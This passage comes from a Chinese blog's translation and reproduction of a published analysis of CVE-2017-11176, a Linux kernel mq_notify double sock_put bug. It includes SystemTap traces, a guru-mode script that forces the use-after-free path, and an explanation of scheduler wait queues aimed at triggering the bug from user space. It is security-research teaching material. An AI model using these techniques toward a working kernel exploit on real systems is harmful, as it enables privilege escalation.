class="line">    sock_ptr = $<span class="keyword">return</span>;                 <span class="comment">// &lt;----- store it</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(5409-5409) &gt;&gt;&gt; mq_notify (4294967295, 0x7ffc59d68a00)</span><br><span class="line">(5409-5409) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(5409-5409) &gt;&gt;&gt; alloc_skb (priority=? size=?)</span><br><span class="line">(5409-5409) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(5409-5409) &gt;&gt;&gt; skb_put (skb=0xffff88003d46af00 len=0x20)</span><br><span class="line">(5409-5409) &lt;&lt;&lt; skb_put = ffff88003ac73e00</span><br><span class="line">(5409-5409) &gt;&gt;&gt; __fdget (fd=0x3)</span><br><span class="line">(5409-5409) &lt;&lt;&lt; __fdget = ffff8800373f6e00</span><br><span class="line">(5409-5409) &gt;&gt;&gt; netlink_getsockbyfilp (filp=0xffff8800373f6e00)</span><br><span class="line">(5409-5409) &lt;&lt;&lt; netlink_getsockbyfilp = ffff880036446000</span><br><span class="line">(5409-5409) &gt;&gt;&gt; netlink_attachskb (sk=0xffff880036446000 skb=0xffff88003d46af00 timeo=0xffff88003a3bbf08 ssk=0x0)</span><br><span class="line">-=&#123; dump_netlink_sock: 0xffff880036446000 &#125;=-</span><br><span class="line">- sk = 0xffff880036446000</span><br><span class="line">- sk-&gt;sk_rmem_alloc = 0</span><br><span class="line">- sk-&gt;sk_rcvbuf = 212992</span><br><span class="line">- sk-&gt;sk_refcnt = 2</span><br><span class="line">- (before) nlk-&gt;state = 0</span><br><span class="line">- (after) nlk-&gt;state = 1</span><br><span class="line">- sk-&gt;sk_flags = 100</span><br><span class="line">- SOCK_DEAD = 0</span><br><span class="line">- sk-&gt;sk_flags = 101</span><br><span class="line">-=&#123; dump_netlink_sock: END&#125;=-</span><br><span class="line">!!&gt;&gt;&gt; REMOVING FD=3 FROM FDT &lt;&lt;&lt;!!</span><br><span class="line">(5409-5409) &lt;&lt;&lt; netlink_attachskb = 1</span><br><span class="line">(5409-5409) &gt;&gt;&gt; __fdget (fd=0x3)</span><br><span class="line">(5409-5409) &lt;&lt;&lt; __fdget = 0</span><br><span class="line">(5409-5409) &gt;&gt;&gt; netlink_detachskb (sk=0xffff880036446000 skb=0xffff88003d46af00)</span><br><span class="line">(5409-5409) &lt;&lt;&lt; netlink_detachskb</span><br><span class="line">-=&#123; dump_netlink_sock: 0xffff880036446000 &#125;=-</span><br><span class="line">- sk = 0xffff880036446000</span><br><span class="line">- sk-&gt;sk_rmem_alloc = 0</span><br><span class="line">- sk-&gt;sk_rcvbuf = 212992</span><br><span class="line">- sk-&gt;sk_refcnt = 0</span><br><span class="line">- nlk-&gt;state = 1</span><br><span class="line">- sk-&gt;sk_flags = 101</span><br><span class="line">- SOCK_DEAD = 0</span><br><span class="line">-=&#123; dump_netlink_sock: END&#125;=-</span><br><span class="line">(5409-5409) &lt;&lt;&lt; mq_notify = fffffffffffffff7</span><br></pre></td></tr></table></figure>

<p>可以看到<code>refcounter</code>从2被减为0，触发漏洞成功。由于<code>refcounter</code>为0，意味着会被释放，加入更多的probe监控kfree：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">probe kernel.function(<span class="string">&quot;kfree&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (execname()==<span class="string">&quot;exploit&quot;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;(%d-%d) &gt;&gt;&gt; kfree (%s)\n&quot;</span>, pid(), tid(), $$parms)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(5729-5729) &gt;&gt;&gt; mq_notify (4294967295, 0x7ffdf31f9fb0)</span><br><span class="line">(5729-5729) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(5729-5729) &gt;&gt;&gt; alloc_skb (priority=? size=?)</span><br><span class="line">(5729-5729) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(5729-5729) &gt;&gt;&gt; skb_put (skb=0xffff88003ac76d00 len=0x20)</span><br><span class="line">(5729-5729) &lt;&lt;&lt; skb_put = ffff88003a9d7e00</span><br><span class="line">(5729-5729) &gt;&gt;&gt; __fdget (fd=0x3)</span><br><span class="line">(5729-5729) &lt;&lt;&lt; __fdget = ffff8800078bd700</span><br><span class="line">(5729-5729) &gt;&gt;&gt; netlink_getsockbyfilp (filp=0xffff8800078bd700)</span><br><span class="line">(5729-5729) &lt;&lt;&lt; netlink_getsockbyfilp = ffff88003af98800</span><br><span class="line">(5729-5729) &gt;&gt;&gt; netlink_attachskb (sk=0xffff88003af98800 skb=0xffff88003ac76d00 timeo=0xffff88003a3d3f08 ssk=0x0)</span><br><span class="line">-=&#123; dump_netlink_sock: 0xffff88003af98800 &#125;=-</span><br><span class="line">- sk = 0xffff88003af98800</span><br><span class="line">- sk-&gt;sk_rmem_alloc = 0</span><br><span class="line">- sk-&gt;sk_rcvbuf = 212992</span><br><span class="line">- sk-&gt;sk_refcnt = 2</span><br><span class="line">- (before) nlk-&gt;state = 0</span><br><span class="line">- (after) nlk-&gt;state = 1</span><br><span class="line">- sk-&gt;sk_flags = 100</span><br><span class="line">- SOCK_DEAD = 0</span><br><span class="line">- sk-&gt;sk_flags = 101</span><br><span class="line">-=&#123; dump_netlink_sock: END&#125;=-</span><br><span class="line">!!&gt;&gt;&gt; REMOVING FD=3 FROM FDT &lt;&lt;&lt;!!</span><br><span class="line">(5729-5729) &lt;&lt;&lt; netlink_attachskb = 1</span><br><span class="line">(5729-5729) &gt;&gt;&gt; __fdget (fd=0x3)</span><br><span class="line">(5729-5729) &lt;&lt;&lt; __fdget = 0</span><br><span class="line">(5729-5729) &gt;&gt;&gt; netlink_detachskb (sk=0xffff88003af98800 skb=0xffff88003ac76d00)</span><br><span class="line">(5729-5729) &gt;&gt;&gt; kfree (objp=0xffff88003a9d7e00)</span><br><span class="line">(5729-5729) &gt;&gt;&gt; kfree (objp=0xffff88003af98800)</span><br><span class="line">(5729-5729) &lt;&lt;&lt; netlink_detachskb</span><br><span class="line">-=&#123; dump_netlink_sock: 0xffff88003af98800 &#125;=-</span><br><span class="line">- sk = 0xffff88003af98800</span><br><span class="line">- sk-&gt;sk_rmem_alloc = 0</span><br><span class="line">- sk-&gt;sk_rcvbuf = 212992</span><br><span class="line">- sk-&gt;sk_refcnt = 0</span><br><span class="line">- nlk-&gt;state = 1</span><br><span class="line">- sk-&gt;sk_flags = 101</span><br><span class="line">- SOCK_DEAD = 0</span><br><span class="line">-=&#123; dump_netlink_sock: END&#125;=-</span><br><span class="line">(5729-5729) &lt;&lt;&lt; mq_notify = fffffffffffffff7</span><br></pre></td></tr></table></figure>

<p>虽然<code>sock</code>被释放了，但还没有<em>use after free</em>。</p>
<h4 id="为什么内核没有崩溃？"><a href="#为什么内核没有崩溃？" class="headerlink" title="为什么内核没有崩溃？"></a>为什么内核没有崩溃？</h4><p>与我们最初的计划不同的是，<code>netlink_sock</code>对象被<code>netlink_detachskb()</code>释放。原因是我们没有调用<code>close()</code>函数（仅重置了FDT），文件对象实际上没有释放，因此<code>netlink_sock</code>对象的引用没有被减少。换句话说，我们少了一次对引用的减少操作。但我们目前只是要验证<code>refcounter</code>是否会被减少两次（<code>netlink_attachskb()</code>和<code>netlink_detachskb()</code>各一次）。</p>
<blockquote>
<p>In the normal course of operation (i.e. we call <em>close()</em>), this additional refcounter decrease will occur and <em>netlink_detachskb()</em> will do a UAF. We will even “delay” this use-after-free to a later moment to get a better control (cf. part 2).</p>
</blockquote>
<h4 id="最终的SystemTap脚本"><a href="#最终的SystemTap脚本" class="headerlink" title="最终的SystemTap脚本"></a>最终的SystemTap脚本</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"># mq_notify_force_crash.stp</span><br><span class="line">#</span><br><span class="line"># Run it with <span class="string">&quot;stap -v -g ./mq_notify_force_crash.stp&quot;</span> (guru mode)</span><br><span class="line"></span><br><span class="line">%&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/sock.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/netlink_sock.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fdtable.h&gt;</span></span></span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">function force_trigger:<span class="keyword">long</span> (arg_sock:<span class="keyword">long</span>)</span><br><span class="line">%&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> = (<span class="title">void</span>*) <span class="title">STAP_ARG_arg_sock</span>;</span></span><br><span class="line">  sk-&gt;sk_flags |= (<span class="number">1</span> &lt;&lt; SOCK_DEAD); <span class="comment">// avoid blocking the thread</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">netlink_sock</span> *<span class="title">nlk</span> = (<span class="title">void</span>*) <span class="title">sk</span>;</span></span><br><span class="line">  nlk-&gt;state |= <span class="number">1</span>;   <span class="comment">// enter the netlink_attachskb() retry path    </span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> *<span class="title">files</span> = <span class="title">current</span>-&gt;<span class="title">files</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> *<span class="title">fdt</span> = <span class="title">files_fdtable</span>(<span class="title">files</span>);</span></span><br><span class="line">  fdt-&gt;fd[<span class="number">3</span>] = <span class="literal">NULL</span>; <span class="comment">// makes the second call to fget() fails</span></span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">probe kernel.function (<span class="string">&quot;netlink_attachskb&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (execname() == <span class="string">&quot;exploit&quot;</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    force_trigger($sk);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="0x06-结论"><a href="#0x06-结论" class="headerlink" title="0x06 结论"></a>0x06 结论</h3><p>在本文中，我们主要介绍了漏洞的相关知识并使用<em>System Tap Guru Mode</em>强制触发漏洞。在下一部分的文章，我们将一步步把当前的从内核态强制触发漏洞的代码转换成从用户态触发。</p>
]]></content>
      <tags>
        <tag>kernel</tag>
        <tag>cve</tag>
        <tag>vul</tag>
      </tags>
  </entry>
  <entry>
    <title>【翻译&amp;复现】CVE-2017-11176分析(2)</title>
    <url>/2019/10/08/CVE-2017-11176-2/</url>
    <content><![CDATA[<p>根据lexfo博客进行的CVE-2017-11176分析和复现（第二部分）。</p>
<a id="more"></a>

<p>源自文章：</p>
<blockquote>
<p><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html">https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html</a></p>
<p><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html">https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html</a></p>
<p><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html">https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html</a></p>
<p><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html">https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html</a></p>
</blockquote>
<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>在<a href="https://sunichi.github.io/2019/07/22/CVE-2017-11176-1/">此前的文章</a>中我们详细分析了CVE-2017-11176（mq_notify: double sock_put()）的原理和相关攻击场景。我们在<em>System Tap</em>的帮助下“强制”在内核态触发并验证了这个bug，并编写了第一个版本的exp。有三个触发bug的条件：</p>
<ol>
<li>强制*netlink_attachskb()*返回1</li>
<li>Unblock exploit thread</li>
<li>强制第二次*fget()*返回NULL</li>
</ol>
<p>在这篇文章中，我们将会尝试不使用<em>System Tap</em>，而是只通过用户态代码来满足上述条件。在本文的结尾，我们将会有能稳定触发bug的poc代码。</p>
<h3 id="0x01-核心概念-2"><a href="#0x01-核心概念-2" class="headerlink" title="0x01 核心概念 #2"></a>0x01 核心概念 #2</h3><p>在核心概念的第二部分将会介绍调度子系统。首先关注的是任务状态和一个任务如何在不同状态间进行转换。注：实际的调度器算法CFS不会在这讨论。主要讨论的是<strong>等待队列</strong>，因为在Unblock thread和获取任意函数调用的时候会用到。</p>
<h4 id="任务状态"><a href="#任务状态" class="headerlink" title="任务状态"></a>任务状态</h4><p>任务的运行状态保存在task_struct的<strong>state</strong>中，一个任务一定是所有状态的其中之一</p>
<ul>
<li><strong>Running</strong>：进程正在CPU上执行或正在等待被运行</li>
<li><strong>Waiting</strong>：进程由于等待事件或资源，处于等待或睡眠状态，</li>
<li>……</li>
</ul>
<p>一个正在运行的任务（<em>TASK_RUNNING</em>）属于<strong>run queue</strong>，它正在被执行或即将被执行。而一个正在等待的任务没有被任何一个CPU执行，它可以在<strong>wait queues</strong>或信号的帮助下被唤醒。正在等待的任务最常见的状态是<em>TASK_INTERRUPTIBLE</em>。</p>
<p>状态被定义在：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// [include/linux/sched.h]</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TASK_RUNNING        0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TASK_INTERRUPTIBLE  1</span></span><br><span class="line"><span class="comment">// ... cut (other states) ...</span></span><br></pre></td></tr></table></figure>

<p><strong>state</strong>可以直接使用或者通过使用current宏的**__set_current_state()**：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// [include/linux/sched.h]</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __set_current_state(state_value)            \</span></span><br><span class="line">    <span class="keyword">do</span> &#123; current-&gt;state = (state_value); &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h4 id="Run-Queues"><a href="#Run-Queues" class="headerlink" title="Run Queues"></a>Run Queues</h4><p>结构体<strong>rq</strong>是调度器中最重要的数据结构之一，每一个在run queue中的任务都会被CPU执行，每一个CPU拥有自己的run queue（运行真正的多任务）。run queue包含在给定CPU上运行“可选”（由调度器）的任务列表。它还有调度器用于做出“公平”选择的统计信息，并最终重新平衡每个CPU之间的负载（即CPU迁移）。</p>
<p>Run queue包含在给定CPU上运行（由调度程序）“可选”的任务列表。 它还具有调度程序用于做出“公平”选择的统计信息，并最终重新平衡每个CPU之间的负载（即CPU迁移）。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// [kernel/sched.c]</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rq</span> &#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> nr_running;   <span class="comment">// &lt;----- statistics</span></span><br><span class="line">  u64 nr_switches;            <span class="comment">// &lt;----- statistics</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">curr</span>;</span>   <span class="comment">// &lt;----- the current running task on the cpu</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>注：在使用CFS的时候，存储实际任务列表的方式有点复杂，但这并不重要。</p>
<p>为了简单起见，考虑从任何run queue中移出的任务不会被执行（即没有CPU来执行它）。这正是<strong>deactivate_task()**函数的功能，而</strong>activate_task()**功能相反。</p>
<h4 id="阻塞一个任务与schedule"><a href="#阻塞一个任务与schedule" class="headerlink" title="阻塞一个任务与schedule()"></a>阻塞一个任务与schedule()</h4><p>当一个任务想要从running转换成waiting状态时，它需要至少做两件事：</p>
<ol>
<li>设置它的运行状态为<em>TASK_INTERRUPTIBLE</em></li>
<li>唤起**deactivate_task()**将它从run queue中移出</li>
</ol>
<p>实际上，没有人直接调用<strong>deactivate_task()**，而是调用</strong>schedule()<strong>。</strong>schedule()<strong>是调度器的主要函数，当调用它时，必须选择下一个（running）任务在CPU上运行，也就是说必须更新run queue的</strong>curr**字段。</p>
<p>但是，如果在当前任务状态不是running时调用<strong>schedule()**（即其状态与零不同），并且没有信号挂起，则它将调用</strong>deactivate_task()**：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">asmlinkage <span class="keyword">void</span> __sched <span class="title">schedule</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> *switch_count;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">rq</span> *<span class="title">rq</span>;</span></span><br><span class="line">  <span class="keyword">int</span> cpu;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... cut ...</span></span><br><span class="line"></span><br><span class="line">  prev = rq-&gt;curr;    <span class="comment">// &lt;---- &quot;prev&quot; is the task running on the current CPU</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (prev-&gt;state &amp;&amp; !(preempt_count() &amp; PREEMPT_ACTIVE)) &#123;   <span class="comment">// &lt;----- ignore the &quot;preempt&quot; stuff</span></span><br><span class="line">    <span class="keyword">if</span> (unlikely(signal_pending_state(prev-&gt;state, prev)))</span><br><span class="line">      prev-&gt;state = TASK_RUNNING;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      deactivate_task(rq, prev, DEQUEUE_SLEEP);     <span class="comment">// &lt;----- task is moved out of run queue</span></span><br><span class="line">    switch_count = &amp;prev-&gt;nvcsw;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ... cut (choose the next task) ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后，任务可以通过执行以下代码来阻塞：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">make_it_block</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __set_current_state(TASK_INTERRUPTIBLE);</span><br><span class="line">  schedule();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>任务将会持续阻塞直到有人唤醒它。</p>
<h4 id="Wait-Queues"><a href="#Wait-Queues" class="headerlink" title="Wait Queues"></a>Wait Queues</h4><p>等待资源或特殊事件非常普遍。 例如，如果运行服务器，主线程可能正在等待传入连接。除非它被标记为“非阻塞”，否则accept()系统调用将阻塞主线程。也就是说，主线程被卡在内核中，直到有东西唤醒它。</p>
<p><strong>wait queue</strong>是当前被阻塞进程的双向链表，有的人可能会把它看<strong>run queue</strong>的“对立面”。其本身用<strong>wait_queue_head_t</strong>表示：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// [include/linux/wait.h]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">wait_queue_head</span> <span class="title">wait_queue_head_t</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">wait_queue_head</span> &#123;</span></span><br><span class="line">    <span class="keyword">spinlock_t</span> lock;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">task_list</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>注</strong>：<strong>struct list_head</strong>是Linux实现双向链表的类型。</p>
<p>链表中的元素类型是<strong>wait_queue_t</strong>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// [include/linux.wait.h]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">wait_queue</span> <span class="title">wait_queue_t</span>;</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*<span class="keyword">wait_queue_func_t</span>)</span><span class="params">(<span class="keyword">wait_queue_t</span> *wait, <span class="keyword">unsigned</span> mode, <span class="keyword">int</span> flags, <span class="keyword">void</span> *key)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">wait_queue</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">    <span class="keyword">void</span> *<span class="keyword">private</span>;                </span><br><span class="line">    <span class="keyword">wait_queue_func_t</span> func;     <span class="comment">// &lt;----- we will get back to this</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">task_list</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>一个wait queue的元素可以使用宏定义**DECLARE_WAITQUEUE()**创建：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// [include/linux/wait.h]</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __WAITQUEUE_INITIALIZER(name, tsk) &#123;                \</span></span><br><span class="line">    .<span class="keyword">private</span>    = tsk,                      \</span><br><span class="line">    .func       = default_wake_function,            \</span><br><span class="line">    .task_list  = &#123; <span class="literal">NULL</span>, <span class="literal">NULL</span> &#125; &#125;</span><br><span class="line"></span><br><span class="line">#define DECLARE_WAITQUEUE(name, tsk)                    \</span><br><span class="line">    <span class="keyword">wait_queue_t</span> name = __WAITQUEUE_INITIALIZER(name, tsk) <span class="comment">// &lt;----- it creates a variable!</span></span><br></pre></td></tr></table></figure>

<p>调用方式：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DECLARE_WAITQUEUE(my_wait_queue_elt, current); <span class="comment">// &lt;----- use the &quot;current&quot; macro</span></span><br></pre></td></tr></table></figure>

<p>最后，一旦声明了一个wait queue的元素，就可以使用**add_wait_queue()**将其排入wait queue中。它仅将元素添加到双向链表中并使用了锁。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// [kernel/wait.c]</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_wait_queue</span><span class="params">(<span class="keyword">wait_queue_head_t</span> *q, <span class="keyword">wait_queue_t</span> *wait)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"></span><br><span class="line">    wait-&gt;flags &amp;= ~WQ_FLAG_EXCLUSIVE;</span><br><span class="line">    spin_lock_irqsave(&amp;q-&gt;lock, flags);</span><br><span class="line">    __add_wait_queue(q, wait);              <span class="comment">// &lt;----- here</span></span><br><span class="line">    spin_unlock_irqrestore(&amp;q-&gt;lock, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> __add_wait_queue(<span class="keyword">wait_queue_head_t</span> *head, <span class="keyword">wait_queue_t</span> *<span class="keyword">new</span>)</span><br><span class="line">&#123;</span><br><span class="line">    list_add(&amp;<span class="keyword">new</span>-&gt;task_list, &amp;head-&gt;task_list);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用**add_wait_queue()**又被称为”registering to a wait queue”。</p>
<h4 id="Waking-up-a-task"><a href="#Waking-up-a-task" class="headerlink" title="Waking up a task"></a>Waking up a task</h4><p>到目前为止，我们知道两种队列：run queues和wait queues。要阻塞一个任务就是使用**deactivate_task()**将其从run queue中删除，但它如何从阻塞（休眠）状态转换回运行状态？</p>
<p><strong>注</strong>：阻塞的任务可以通过信号或其他方式唤醒，但这超出了本次的讨论范围。</p>
<p>由于被阻塞的任务不再运行，因此无法自行唤醒，唤醒工作需要由另一个任务完成。</p>
<p>具有特定资源所有权的数据结构具有wait queue，当任务想要访问此资源但不可用时，改任务可以使自己处于休眠状态，直到资源所有者唤醒为止。为了在资源可用时被唤醒，它必须注册到资源的等待队列。正如我们之前看到的，这个“注册”是通过<strong>add_wait_queue()**完成的。当资源可用时，资源所有者唤醒一个或多个任务，以便它们能够继续执行。这是通过</strong>__wake_up()**完成的。</p>
<p>当资源可用时，所有者唤醒一个或多个任务，以便他们可以继续执行。这是通过__wake_up（）函数完成的：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// [kernel/sched.c]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * __wake_up - wake up threads blocked on a waitqueue.</span></span><br><span class="line"><span class="comment"> * @q: the waitqueue</span></span><br><span class="line"><span class="comment"> * @mode: which threads</span></span><br><span class="line"><span class="comment"> * @nr_exclusive: how many wake-one or wake-many threads to wake up</span></span><br><span class="line"><span class="comment"> * @key: is directly passed to the wakeup function</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * It may be assumed that this function implies a write memory barrier before</span></span><br><span class="line"><span class="comment"> * changing the task state if and only if any tasks are woken up.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __wake_up(<span class="keyword">wait_queue_head_t</span> *q, <span class="keyword">unsigned</span> <span class="keyword">int</span> mode,</span><br><span class="line">            <span class="keyword">int</span> nr_exclusive, <span class="keyword">void</span> *key)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"></span><br><span class="line">    spin_lock_irqsave(&amp;q-&gt;lock, flags);</span><br><span class="line">    __wake_up_common(q, mode, nr_exclusive, <span class="number">0</span>, key);    <span class="comment">// &lt;----- here</span></span><br><span class="line">    spin_unlock_irqrestore(&amp;q-&gt;lock, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="comment">// [kernel/sched.c]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> __wake_up_common(<span class="keyword">wait_queue_head_t</span> *q, <span class="keyword">unsigned</span> <span class="keyword">int</span> mode,</span><br><span class="line">          <span class="keyword">int</span> nr_exclusive, <span class="keyword">int</span> wake_flags, <span class="keyword">void</span> *key)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">wait_queue_t</span> *curr, *next;</span><br><span class="line"></span><br><span class="line">[<span class="number">0</span>]   list_for_each_entry_safe(curr, next, &amp;q-&gt;task_list, task_list) &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> flags = curr-&gt;flags;</span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>]     <span class="keyword">if</span> (curr-&gt;func(curr, mode, wake_flags, key) &amp;&amp;</span><br><span class="line">            (flags &amp; WQ_FLAG_EXCLUSIVE) &amp;&amp; !--nr_exclusive)</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>此函数迭代wait queue[0]中的每个元素（<strong>list_for_each_entry_safe()**是与双向链表一起使用的公共宏）。对于每个元素，它调用</strong>func()<strong>回调函数[1]。还记得</strong>DECLARE_WAITQUEUE()<strong>宏吗？它将func回调设置成</strong>default_wake_function()**：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// [include/linux/wait.h]</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __WAITQUEUE_INITIALIZER(name, tsk) &#123;                \</span></span><br><span class="line">    .<span class="keyword">private</span>    = tsk,                      \</span><br><span class="line">    .func       = default_wake_function,            \                 <span class="comment">// &lt;------</span></span><br><span class="line">    .task_list  = &#123; <span class="literal">NULL</span>, <span class="literal">NULL</span> &#125; &#125;</span><br><span class="line"></span><br><span class="line">#define DECLARE_WAITQUEUE(name, tsk)                    \</span><br><span class="line">    <span class="keyword">wait_queue_t</span> name = __WAITQUEUE_INITIALIZER(name, tsk)</span><br></pre></td></tr></table></figure>

<p>反过来，<strong>default_wake_function()**只使用wait queue元素的私有字段调用</strong>try_to_wake_up()**（在大多数情况下指向睡眠的任务的task_struct）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">default_wake_function</span><span class="params">(<span class="keyword">wait_queue_t</span> *curr, <span class="keyword">unsigned</span> mode, <span class="keyword">int</span> wake_flags,</span></span></span><br><span class="line"><span class="function"><span class="params">              <span class="keyword">void</span> *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> try_to_wake_up(curr-&gt;<span class="keyword">private</span>, mode, wake_flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后，<strong>try_to_wake_up()**是</strong>schedule()<strong>的对立面，当</strong>schedult()<strong>调出当前任务时，</strong>try_to_wake_up()**可使其再次可调度。也就是说，它将其置于run queue中并改变其运行状态。</p>
